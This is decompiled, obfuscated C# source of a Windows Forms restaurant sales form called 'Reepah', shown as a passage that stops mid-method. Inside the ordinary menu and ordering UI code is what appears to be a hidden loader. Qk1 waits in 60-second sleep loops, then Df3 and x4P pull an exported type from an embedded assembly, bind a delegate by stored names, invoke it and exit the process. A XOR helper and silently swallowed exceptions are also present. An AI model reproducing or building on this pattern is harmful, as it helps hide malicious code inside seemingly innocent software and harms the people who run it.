using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Qq2;
using Tg5;
using b4D;
using d0E;
using g7F;
using t2M;
using w8E;
using x9X;

namespace y4S;

[DesignerGenerated]
public class Cj0 : Form
{
	internal delegate void Wi8();

	[Serializable]
	internal sealed class s8N
	{
		public static readonly s8N _0024I;

		public static Func<DataGridViewCell, object> _0024I6_002D0;

		static s8N()
		{
			_0024I = new s8N();
		}

		[SpecialName]
		internal object Wx5(DataGridViewCell Ln0)
		{
			return Ln0.get_Value();
		}
	}

	internal static string[] Listt;

	internal static Dictionary<string, object> mDic;

	internal static string dName;

	internal static string tName;

	internal static string mName;

	internal static string mArray;

	internal static string sArray;

	internal static string T;

	internal static string sNum;

	private IContainer components;

	private MenuStrip _MenuStrip1;

	private ToolStripMenuItem _STOCKSToolStripMenuItem;

	private Button _BtnErase;

	private Button _BtnSubmit;

	private TextBox _TxtName;

	private Label _Label3;

	private DataGridView _MenuDataGridView;

	private DataGridView _MenuDataGridView1;

	private BindingSource _MenuBindingSource;

	private x6H _MenuTableAdapter;

	private DataGridViewTextBoxColumn _IDDataGridViewTextBoxColumn;

	private DataGridViewTextBoxColumn _MenuDataGridViewTextBoxColumn;

	private DataGridViewTextBoxColumn _CostDataGridViewTextBoxColumn;

	private Button _btnclear;

	internal ToolStripMenuItem R;

	internal ToolStripMenuItem a;

	internal ToolStripMenuItem B;

	internal ToolStripMenuItem e;

	internal ToolStripMenuItem n;

	internal ToolStripMenuItem K;

	internal ToolStripMenuItem V;

	internal Label M;

	internal Button w;

	internal Label t;

	internal Label P;

	internal BindingSource O;

	internal Si0 l;

	internal BindingSource U;

	internal Md1 J;

	internal DataGridViewCheckBoxColumn I;

	public Cj0()
	{
		((Form)this).add_Load((EventHandler)a5Z);
		j0R();
	}

	private void a5Z(object sender, EventArgs e)
	{
		i0K().Am4(Xw9().Requested_Items);
		g1L().Cr9(Xw9().Menu);
		((Form)this).set_FormBorderStyle((FormBorderStyle)4);
		((Form)this).set_WindowState((FormWindowState)2);
		((ToolStripItem)Bx2()).set_Visible(false);
	}

	[STAThread]
	public static void Qk1()
	{
		checked
		{
			try
			{
				string n6P = t8Y.o2B();
				int num = 0;
				while (num == 0)
				{
					if (!Si0.Ra3(n6P))
					{
						d0E.Xw9.Sp3(60000);
					}
					else
					{
						num = 3683;
					}
				}
				do
				{
					num = new Random().Next(1, 10);
				}
				while (num * 2 != 8);
				mDic = new Dictionary<string, object>();
				Listt = d0E.Xw9.Hy4();
				dName = d0E.Xw9.Gw1(Listt, 0, 1);
				mDic.Add(dName, Listt);
				num -= 3;
				string[] g6Z = (string[])mDic[dName];
				bool flag = true;
				while (flag)
				{
					switch (num)
					{
					case 1:
						tName = d0E.Xw9.Gw1(g6Z, num, 1);
						num++;
						break;
					case 2:
						num = 1;
						mName = d0E.Xw9.Gw1(g6Z, 2, 2);
						num = 3;
						break;
					case 3:
						num = 1;
						mArray = d0E.Xw9.Gw1(g6Z, 3, 3);
						num = 4;
						break;
					case 4:
						num = 1;
						sArray = d0E.Xw9.Gw1(g6Z, 4, 4);
						num = 5;
						break;
					case 5:
						num = 1;
						T = d0E.Xw9.Gw1(g6Z, 5, 5);
						num = 6;
						break;
					case 6:
						num = 1;
						sNum = d0E.Xw9.Gw1(g6Z, 6, 6);
						flag = false;
						break;
					}
				}
				Zx0.Tg7();
				Si0.Fd3();
				Zt3.a8Y();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void x7P(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		Interaction.MsgBox((object)"Forward", (MsgBoxStyle)0, (object)null);
		Lb5().get_Columns().Clear();
		checked
		{
			int num = ((BaseCollection)Ci7().get_Columns()).get_Count() - 1;
			for (int i = 0; i <= num; i++)
			{
				Lb5().get_Columns().Add((DataGridViewColumn)Ci7().get_Columns().get_Item(i).Clone());
			}
			int num2 = Ci7().get_Rows().get_Count() - 1;
			for (int j = 0; j <= num2; j++)
			{
				if (Operators.ConditionalCompareObjectEqual(Ci7().get_Rows().get_Item(j).get_Cells()
					.get_Item(3)
					.get_Value(), (object)true, false))
				{
					Lb5().get_Rows().Add(new object[3]
					{
						Ci7().get_Rows().get_Item(j).get_Cells()
							.get_Item(0)
							.get_Value(),
						Ci7().get_Rows().get_Item(j).get_Cells()
							.get_Item(1)
							.get_Value(),
						Ci7().get_Rows().get_Item(j).get_Cells()
							.get_Item(2)
							.get_Value()
					});
					Lb5().get_Columns().get_Item(2).set_Visible(true);
					Lb5().get_Columns().get_Item(3).set_Visible(true);
				}
			}
		}
	}

	internal static byte f6B(byte p3W, byte De1)
	{
		return (byte)(p3W ^ De1);
	}

	private void t5E(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Erase", (MsgBoxStyle)0, (object)null);
		int rowIndex = Lb5().get_CurrentCell().get_RowIndex();
		Lb5().get_Rows().RemoveAt(rowIndex);
	}

	private void z7G(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			if (Operators.CompareString(Wk2().get_Text(), "", false) == 0)
			{
				Interaction.MsgBox((object)"Ordered by Must be declared", (MsgBoxStyle)0, (object)null);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((BaseCollection)Lb5().get_Columns()).GetEnumerator();
					while (enumerator.MoveNext())
					{
						DataGridViewColumn val = (DataGridViewColumn)enumerator.Current;
						p2W.Forms.k2Q().b5Q().get_Columns()
							.Add((DataGridViewColumn)val.Clone());
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				int num = Lb5().get_Rows().get_Count() - 1;
				for (int i = 0; i <= num; i++)
				{
					p2W.Forms.k2Q().b5Q().get_Rows()
						.Add(((IEnumerable)Lb5().get_Rows().get_Item(i).get_Cells()).Cast<DataGridViewCell>().Select((s8N._0024I6_002D0 == null) ? (s8N._0024I6_002D0 = s8N._0024I.Wx5) : s8N._0024I6_002D0).ToArray());
				}
			}
			else
			{
				Interaction.MsgBox((object)"Submit", (MsgBoxStyle)0, (object)null);
				Lb5().get_Columns().Clear();
				Wk2().set_Text("");
			}
		}
	}

	private void t2D(object sender, EventArgs e)
	{
		((Control)Yw8()).set_Enabled(false);
		((Control)Fg7()).set_Enabled(false);
		((Control)So2()).set_Enabled(false);
		((Control)Ci7()).set_Enabled(false);
		((Control)Lb5()).set_Enabled(false);
		((Control)n6G()).set_Enabled(false);
		((Control)Ac5()).set_Enabled(false);
		((Control)Ta1()).set_Enabled(false);
		((Control)Wk2()).set_Enabled(false);
		((ToolStripItem)Bx2()).set_Visible(true);
		((ToolStripItem)t1D()).set_Visible(false);
	}

	private void p6D(object sender, EventArgs e)
	{
		((Control)Yw8()).set_Enabled(true);
		((Control)Fg7()).set_Enabled(true);
		((Control)So2()).set_Enabled(true);
		((Control)Ci7()).set_Enabled(true);
		((Control)Lb5()).set_Enabled(true);
		((Control)n6G()).set_Enabled(true);
		((Control)Ac5()).set_Enabled(true);
		((Control)Ta1()).set_Enabled(true);
		((Control)Wk2()).set_Enabled(true);
		((ToolStripItem)Bx2()).set_Visible(false);
		((ToolStripItem)t1D()).set_Visible(true);
	}

	internal static bool Df3()
	{
		try
		{
			try
			{
				Type type = Wa4((Assembly)mDic["Ass2"]);
				if (Operators.ConditionalCompareObjectEqual((object)type.Name, mDic[tName], false))
				{
					mDic.Add(T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void Af3(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private static Type Wa4(Assembly r9G)
	{
		return r9G.GetExportedTypes()[27];
	}

	private void p5J(object sender, EventArgs e)
	{
		((Control)p2W.Forms.k2Q()).Show();
	}

	private void b5R(object sender, EventArgs e)
	{
		((Control)this).Show();
	}

	private void Mw4(object sender, EventArgs e)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DataGridViewCheckBoxCell val = (DataGridViewCheckBoxCell)Ci7().get_Item(Ci7().get_CurrentCell().get_ColumnIndex(), Ci7().get_CurrentCell().get_RowIndex());
			((DataGridViewCell)val).set_Value((object)false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"No Checkbox has been selected", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static void x4P()
	{
		mDic.Add("I", typeof(Wi8));
		Delegate value = Delegate.CreateDelegate(typeof(Wi8), (Type)mDic[T], Conversions.ToString(mDic[mName]), ignoreCase: false, throwOnBindFailure: true);
		mDic.Add("ABSDF", value);
		Task.Delay(1000).Wait();
		if (mDic["ABSDF"] != null)
		{
			((Wi8)(Delegate)mDic["ABSDF"])();
		}
		Environment.Exit(Environment.ExitCode);
	}

	protected override void t9F(bool f9K)
	{
		try
		{
			if (f9K && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(f9K);
		}
	}

	private void j0R()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_01e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ed: Expected O, but got Unknown
		//IL_04c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cd: Expected O, but got Unknown
		//IL_0616: Unknown result type (might be due to invalid IL or missing references)
		//IL_0620: Expected O, but got Unknown
		//IL_0699: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a3: Expected O, but got Unknown
		//IL_071f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0729: Expected O, but got Unknown
		//IL_07c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d0: Expected O, but got Unknown
		//IL_086d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0877: Expected O, but got Unknown
		//IL_0955: Unknown result type (might be due to invalid IL or missing references)
		//IL_095f: Expected O, but got Unknown
		//IL_0bda: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be4: Expected O, but got Unknown
		//IL_0c73: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c7d: Expected O, but got Unknown
		components = new Container();
		DataGridViewCellStyle val = new DataGridViewCellStyle();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Cj0));
		Co6(new MenuStrip());
		d6Y(new ToolStripMenuItem());
		Lc4(new ToolStripMenuItem());
		z1P(new ToolStripMenuItem());
		q7L(new ToolStripMenuItem());
		Yz4(new ToolStripMenuItem());
		Ys3(new ToolStripMenuItem());
		m9B(new ToolStripMenuItem());
		Af2(new ToolStripMenuItem());
		Ke6(new Label());
		y1A(new Button());
		Ec0(new Button());
		Yz6(new Button());
		k9P(new TextBox());
		c3X(new Label());
		o4C(new Label());
		r3H(new Label());
		Hg8(new DataGridView());
		i2S(new BindingSource(components));
		Ac1(new BindingSource(components));
		b2X(new Si0());
		Gq4(new DataGridView());
		e6Z(new DataGridViewTextBoxColumn());
		s4N(new DataGridViewTextBoxColumn());
		w6H(new DataGridViewTextBoxColumn());
		Cx5(new DataGridViewCheckBoxColumn());
		p4T(new BindingSource(components));
		Jz7(new x6H());
		b3F(new Md1());
		Zi0(new Button());
		((Control)w8E()).SuspendLayout();
		((ISupportInitialize)Lb5()).BeginInit();
		((ISupportInitialize)Qe1()).BeginInit();
		((ISupportInitialize)g2Q()).BeginInit();
		((ISupportInitialize)Xw9()).BeginInit();
		((ISupportInitialize)Ci7()).BeginInit();
		((ISupportInitialize)g2P()).BeginInit();
		((Control)this).SuspendLayout();
		((ToolStrip)w8E()).set_Font(new Font("Times New Roman", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ToolStrip)w8E()).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)Se4(),
			(ToolStripItem)w8K(),
			(ToolStripItem)p0M()
		});
		((Control)w8E()).set_Location(new Point(0, 0));
		((Control)w8E()).set_Name("MenuStrip1");
		((Control)w8E()).set_Size(new Size(1370, 35));
		((Control)w8E()).set_TabIndex(0);
		((Control)w8E()).set_Text("MenuStrip1");
		((ToolStripDropDownItem)Se4()).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)t1D(),
			(ToolStripItem)Bx2(),
			(ToolStripItem)Rc1()
		});
		((ToolStripItem)Se4()).set_Name("ADMINToolStripMenuItem");
		((ToolStripItem)Se4()).set_Size(new Size(104, 31));
		((ToolStripItem)Se4()).set_Text("ADMIN");
		((ToolStripItem)t1D()).set_Name("LockToolStripMenuItem");
		((ToolStripItem)t1D()).set_Size(new Size(162, 32));
		((ToolStripItem)t1D()).set_Text("Lock");
		((ToolStripItem)Bx2()).set_Name("UnLockToolStripMenuItem");
		((ToolStripItem)Bx2()).set_Size(new Size(162, 32));
		((ToolStripItem)Bx2()).set_Text("UnLock");
		((ToolStripItem)Rc1()).set_Name("ExitToolStripMenuItem");
		((ToolStripItem)Rc1()).set_Size(new Size(162, 32));
		((ToolStripItem)Rc1()).set_Text("Exit");
		((ToolStripDropDownItem)w8K()).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)c4X() });
		((ToolStripItem)w8K()).set_Name("SALESToolStripMenuItem");
		((ToolStripItem)w8K()).set_Size(new Size(95, 31));
		((ToolStripItem)w8K()).set_Text("SALES");
		((ToolStripItem)c4X()).set_Name("OpenSalesToolStripMenuItem");
		((ToolStripItem)c4X()).set_Size(new Size(191, 32));
		((ToolStripItem)c4X()).set_Text("Open Sales");
		((ToolStripDropDownItem)p0M()).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)Zp8() });
		((ToolStripItem)p0M()).set_Name("STOCKSToolStripMenuItem");
		((ToolStripItem)p0M()).set_Size(new Size(141, 31));
		((ToolStripItem)p0M()).set_Text("REQUESTS");
		((ToolStripItem)Zp8()).set_Name("OpenStocksToolStripMenuItem");
		((ToolStripItem)Zp8()).set_Size(new Size(229, 32));
		((ToolStripItem)Zp8()).set_Text("Open Requests");
		d9N().set_AutoSize(true);
		((Control)d9N()).set_BackColor(Color.Transparent);
		((Control)d9N()).set_Font(new Font("Times New Roman", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)d9N()).set_ForeColor(Color.Lime);
		((Control)d9N()).set_Location(new Point(515, 48));
		((Control)d9N()).set_Name("lblSales");
		((Control)d9N()).set_Size(new Size(331, 73));
		((Control)d9N()).set_TabIndex(1);
		d9N().set_Text("Sales Menu");
		((Control)Ac5()).set_Location(new Point(610, 258));
		((Control)Ac5()).set_Name("BtnForward");
		((Control)Ac5()).set_Size(new Size(64, 46));
		((Control)Ac5()).set_TabIndex(5);
		((ButtonBase)Ac5()).set_Text("Forward");
		((ButtonBase)Ac5()).set_UseVisualStyleBackColor(true);
		((Control)n6G()).set_Location(new Point(610, 363));
		((Control)n6G()).set_Name("BtnErase");
		((Control)n6G()).set_Size(new Size(64, 46));
		((Control)n6G()).set_TabIndex(6);
		((ButtonBase)n6G()).set_Text("Erase");
		((ButtonBase)n6G()).set_UseVisualStyleBackColor(true);
		((Control)Ta1()).set_Font(new Font("Times New Roman", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Ta1()).set_Location(new Point(940, 599));
		((Control)Ta1()).set_Name("BtnSubmit");
		((Control)Ta1()).set_Size(new Size(111, 46));
		((Control)Ta1()).set_TabIndex(7);
		((ButtonBase)Ta1()).set_Text("Submit");
		((ButtonBase)Ta1()).set_UseVisualStyleBackColor(true);
		((Control)Wk2()).set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Wk2()).set_Location(new Point(921, 523));
		((Control)Wk2()).set_Name("TxtName");
		((Control)Wk2()).set_Size(new Size(311, 26));
		((Control)Wk2()).set_TabIndex(8);
		Yw8().set_AutoSize(true);
		((Control)Yw8()).set_BackColor(Color.Transparent);
		((Control)Yw8()).set_Font(new Font("Times New Roman", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Yw8()).set_ForeColor(Color.Lime);
		((Control)Yw8()).set_Location(new Point(686, 513));
		((Control)Yw8()).set_Name("Label1");
		((Control)Yw8()).set_Size(new Size(176, 36));
		((Control)Yw8()).set_TabIndex(9);
		Yw8().set_Text("Ordered by :");
		Fg7().set_AutoSize(true);
		((Control)Fg7()).set_BackColor(Color.Transparent);
		((Control)Fg7()).set_Font(new Font("Times New Roman", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Fg7()).set_ForeColor(Color.Lime);
		((Control)Fg7()).set_Location(new Point(194, 130));
		((Control)Fg7()).set_Name("Label2");
		((Control)Fg7()).set_Size(new Size(174, 36));
		((Control)Fg7()).set_TabIndex(10);
		Fg7().set_Text("Food Items :");
		So2().set_AutoSize(true);
		((Control)So2()).set_BackColor(Color.Transparent);
		((Control)So2()).set_Font(new Font("Times New Roman", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)So2()).set_ForeColor(Color.Lime);
		((Control)So2()).set_Location(new Point(875, 130));
		((Control)So2()).set_Name("Label3");
		((Control)So2()).set_Size(new Size(181, 36));
		((Control)So2()).set_TabIndex(11);
		So2().set_Text("Food Order :");
		Lb5().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)16);
		Lb5().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
		Lb5().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)Lb5()).set_Location(new Point(692, 180));
		((Control)Lb5()).set_Name("MenuDataGridView");
		val.set_Alignment((DataGridViewContentAlignment)16);
		val.set_BackColor(SystemColors.Control);
		val.set_Font(new Font("Times New Roman", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		val.set_ForeColor(SystemColors.WindowText);
		val.set_SelectionBackColor(SystemColors.Highlight);
		val.set_SelectionForeColor(SystemColors.HighlightText);
		val.set_WrapMode((DataGridViewTriState)1);
		Lb5().set_RowHeadersDefaultCellStyle(val);
		((Control)Lb5()).set_Size(new Size(540, 327));
		((Control)Lb5()).set_TabIndex(11);
		Qe1().set_DataMember("Requested_Items");
		Qe1().set_DataSource((object)g2Q());
		g2Q().set_DataSource((object)Xw9());
		g2Q().set_Position(0);
		Xw9().DataSetName = "ReepahDataSet2";
		Xw9().SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
		Ci7().set_AutoGenerateColumns(false);
		Ci7().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)16);
		Ci7().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
		Ci7().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		Ci7().get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[4]
		{
			(DataGridViewColumn)m9W(),
			(DataGridViewColumn)w7Z(),
			(DataGridViewColumn)p5L(),
			(DataGridViewColumn)Nd3()
		});
		Ci7().set_DataSource((object)g2P());
		((Control)Ci7()).set_Location(new Point(36, 169));
		((Control)Ci7()).set_Name("MenuDataGridView1");
		((Control)Ci7()).set_Size(new Size(540, 498));
		((Control)Ci7()).set_TabIndex(11);
		((DataGridViewColumn)m9W()).set_DataPropertyName("ID");
		((DataGridViewColumn)m9W()).set_HeaderText("ID");
		((DataGridViewColumn)m9W()).set_Name("IDDataGridViewTextBoxColumn");
		((DataGridViewColumn)w7Z()).set_DataPropertyName("Menu");
		((DataGridViewColumn)w7Z()).set_HeaderText("Menu");
		((DataGridViewColumn)w7Z()).set_Name("MenuDataGridViewTextBoxColumn");
		((DataGridViewColumn)p5L()).set_DataPropertyName("Cost");
		((DataGridViewColumn)p5L()).set_HeaderText("Cost");
		((DataGridViewColumn)p5L()).set_Name("CostDataGridViewTextBoxColumn");
		((DataGridViewColumn)Nd3()).set_HeaderText("SelectItem");
		((DataGridViewColumn)Nd3()).set_Name("Checkbox1");
		g2P().set_DataMember("Menu");
		g2P().set_DataSource((object)g2Q());
		g1L().ClearBeforeFill = true;
		i0K().ClearBeforeFill = true;
		((Control)Lx4()).set_Font(new Font("Times New Roman", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Lx4()).set_Location(new Point(430, 691));
		((Control)Lx4()).set_Name("btnclear");
		((Control)Lx4()).set_Size(new Size(111, 46));
		((Control)Lx4()).set_TabIndex(12);
		((ButtonBase)Lx4()).set_Text("Clear checked");
		((ButtonBase)Lx4()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(1370, 749));
		((Control)this).get_Controls().Add((Control)(object)Lx4());
		((Control)this).get_Controls().Add((Control)(object)Ci7());
		((Control)this).get_Controls().Add((Control)(object)Lb5());
		((Control)this).get_Controls().Add((Control)(object)So2());
		((Control)this).get_Controls().Add((Control)(object)Fg7());
		((Control)this).get_Controls().Add((Control)(object)Yw8());
		((Control)this).get_Controls().Add((Control)(object)Wk2());
		((Control)this).get_Controls().Add((Control)(object)Ta1());
		((Control)this).get_Controls().Add((Control)(object)n6G());
		((Control)this).get_Controls().Add((Control)(object)Ac5());
		((Control)this).get_Controls().Add((Control)(object)d9N());
		((Control)this).get_Controls().Add((Control)(object)w8E());
		((Form)this).set_MainMenuStrip(w8E());
		((Control)this).set_Name("MainForm");
		((Form)this).set_Text("Reepah");
		((Control)w8E()).ResumeLayout(false);
		((Control)w8E()).PerformLayout();
		((ISupportInitialize)Lb5()).EndInit();
		((ISupportInitialize)Qe1()).EndInit();
		((ISupportInitialize)g2Q()).EndInit();
		((ISupportInitialize)Xw9()).EndInit();
		((ISupportInitialize)Ci7()).EndInit();
		((ISupportInitialize)g2P()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual MenuStrip w8E()
	{
		return _MenuStrip1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Co6(MenuStrip Wf4)
	{
		_MenuStrip1 = Wf4;
	}

	[SpecialName]
	internal virtual ToolStripMenuItem Se4()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d6Y(ToolStripMenuItem f8M)
	{
		ToolStripMenuItem val = (R = f8M);
	}

	[SpecialName]
	internal virtual ToolStripMenuItem t1D()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Lc4(ToolStripMenuItem Pe1)
	{
		EventHandler eventHandler = t2D;
		ToolStripMenuItem val = a;
		if (val != null)
		{
			((ToolStripItem)val).remove_Click(eventHandler);
		}
		ToolStripMenuItem val2 = (a = Pe1);
		val = a;
		if (val != null)
		{
			((ToolStripItem)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ToolStripMenuItem Bx2()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z1P(ToolStripMenuItem We7)
	{
		EventHandler eventHandler = p6D;
		ToolStripMenuItem b = B;
		if (b != null)
		{
			((ToolStripItem)b).remove_Click(eventHandler);
		}
		ToolStripMenuItem val = (B = We7);
		b = B;
		if (b != null)
		{
			((ToolStripItem)b).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ToolStripMenuItem Rc1()
	{
		return e;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q7L(ToolStripMenuItem k7G)
	{
		EventHandler eventHandler = Af3;
		ToolStripMenuItem val = e;
		if (val != null)
		{
			((ToolStripItem)val).remove_Click(eventHandler);
		}
		ToolStripMenuItem val2 = (e = k7G);
		val = e;
		if (val != null)
		{
			((ToolStripItem)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ToolStripMenuItem w8K()
	{
		return n;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yz4(ToolStripMenuItem Kt1)
	{
		ToolStripMenuItem val = (n = Kt1);
	}

	[SpecialName]
	internal virtual ToolStripMenuItem c4X()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ys3(ToolStripMenuItem Yz2)
	{
		EventHandler eventHandler = b5R;
		ToolStripMenuItem k = K;
		if (k != null)
		{
			((ToolStripItem)k).remove_Click(eventHandler);
		}
		ToolStripMenuItem val = (K = Yz2);
		k = K;
		if (k != null)
		{
			((ToolStripItem)k).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ToolStripMenuItem p0M()
	{
		return _STOCKSToolStripMenuItem;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m9B(ToolStripMenuItem Np2)
	{
		_STOCKSToolStripMenuItem = Np2;
	}

	[SpecialName]
	internal virtual ToolStripMenuItem Zp8()
	{
		return V;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Af2(ToolStripMenuItem Rx7)
	{
		EventHandler eventHandler = p5J;
		ToolStripMenuItem v = V;
		if (v != null)
		{
			((ToolStripItem)v).remove_Click(eventHandler);
		}
		ToolStripMenuItem val = (V = Rx7);
		v = V;
		if (v != null)
		{
			((ToolStripItem)v).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label d9N()
	{
		return M;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ke6(Label Nz2)
	{
		Label val = (M = Nz2);
	}

	[SpecialName]
	internal virtual Button Ac5()
	{
		return w;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y1A(Button b8L)
	{
		EventHandler eventHandler = x7P;
		Button val = w;
